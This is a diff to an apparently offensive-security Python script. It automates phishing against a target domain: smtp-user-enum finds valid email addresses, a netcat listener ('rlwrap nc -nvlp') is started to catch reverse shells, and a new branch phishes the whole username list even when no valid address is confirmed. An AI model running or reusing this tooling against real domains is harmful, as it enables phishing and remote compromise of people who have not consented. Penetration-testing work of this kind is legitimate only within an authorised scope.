@@ -2942,7 +2942,7 @@ while True:
                   phish = phish.rstrip("\n")
                   print(colored(phish,colour3))
                print("")            
-            print("[*] Checking for valid usernames...")
+            print("[*] Checking for valid usernames, please wait...")
          
             command("smtp-user-enum -U " + dataDir + "/usernames.txt -d " + DOM.rstrip(" ") + " -m RCPT " + DOM.rstrip(" ") + " 25 | grep SUCC > valid1.tmp")                 
             command("tr -cd '\11\12\15\40-\176' < valid1.tmp > valid.tmp")         
@@ -2962,24 +2962,23 @@ while True:
                   if "TEST" not in line:                  
                      command("echo " + line + " >> phish.tmp")
                      match = 1                  
-            if match == 1:						# SHOW FOUND PHISH
+            if match == 1: 						# SHOW FOUND PHISH
                 print("[+] Found valid email addresses...\n")
                 with open("phish.tmp", "r") as list:
                    for line in list:
                       line = line.rstrip("\n")
-                      print(colored(line + "@" + DOM.rstrip(" "),colour6))                           
+                      print(colored(line + "@" + DOM.rstrip(" "),colour6))
          
-            print("[*] Starting phishing server...")
-                   
+            print("[*] Starting phishing server...")                   
             command("xdotool key Ctrl+Shift+T")
             command("xdotool key Alt+Shift+S; xdotool type 'GONE PHISHING'; xdotool key Return")
             command("xdotool type 'clear; cat " + dataDir + "/banner5.txt'; xdotool key Return")
-            command("xdotool type 'rlwrap nc -nvlp " + num + "'; xdotool key Return")
+            command("xdotool type 'rlwrap nc -nvlp " + checkParams + "'; xdotool key Return")
             command("xdotool key Ctrl+Tab")      
-                   
-            if match == 1:
-               print("\n[*] Phishing the list...")			# GO PHISHING
-               with open("phish.tmp", "r") as list:
+            
+            if match == 0:
+               print("[-] Phish not found, phishing the list anyway..")
+               with open(dataDir + "/usernames.txt", "r") as list:
                   for phish in list:
                      phish = phish.rstrip("\n")
                      phish = phish.strip(" ")
